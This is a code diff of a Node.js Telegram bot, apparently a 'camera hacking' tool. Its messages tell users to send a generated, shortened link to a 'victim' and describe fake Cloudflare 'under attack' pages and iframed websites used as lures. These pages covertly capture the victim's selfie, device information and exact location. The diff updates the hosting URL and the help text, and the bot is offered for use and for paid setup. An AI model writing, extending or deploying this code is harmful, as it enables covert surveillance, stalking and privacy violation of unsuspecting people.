@@ -14,7 +14,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="UPDATE URL HERE";
+var hostURL="https://TechieCamHackBot.techie24876.repl.co";
 //TOGGLE for 1pt Proxy and Shorters
 var use1pt=true;
 
@@ -71,19 +71,13 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to Camera Hacking Bot people just through a simple link.\n\nIt can gather informations like location , device info, camera snaps.\n\n If You Want To Create Your Bot Like This Then Watch Tutorial From Here @TechieGamer\n\nIf You Want I Make You Bot Working For Lifetime Then DM Me @TechieGamerBot But It Cost 50 Rs.\n\nJoin @TechieGamer for more tool.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou Can Use This Bot To Camera Hacking Bot People Just Through A Simple Link.\n\nIt Can Gather Informations Like Location , Device Info, Camera Snaps.\n\n If You Want To Create Your Bot Like This Then Watch Tutorial From Here @TechieGamer\n\nIf You Want I Make Your Bot Working For Lifetime Then DM Me @TechieGamerBot But It Cost 50 Rs.\n\nJoin @TechieGamer for more tool.\n\nType /help for more info.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
-bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
-to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
-the url it will send you 2 links which you can use to track people.
-\n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
-\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
-( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
+bot.sendMessage(chatId,`Click On Start Button Then Click On Create\n\nThen Send Any Website Link To Bot.\n\nThen Bot Send You Some Links Copy Any 1 Link And Send To Victim\n\nWhen Victim Open The Link Then You Will Get His Selfie, Mobile Info & If His Mobile Location Is On Then You Will Get His Exact Location Of Google Maps\n\n(⚠️ Many Sites May Not Work Under This Method If They Have X-frame Header Present.Ex https://google.com)
 \n\nJoin Telegram Channel: https://t.me/TechieGamer
 `);
 }
@@ -124,8 +118,9 @@ var wUrl=`${hostURL}/w/${url}`;
   
 bot.sendChatAction(cid,"typing");
 if(use1pt){
-var x=await fetch(https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}).then(res => res.json());
-var y=await fetch(https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}).then(res => res.json());
+var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
+var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
+
 var f="",g="";
 
 for(var c in x){
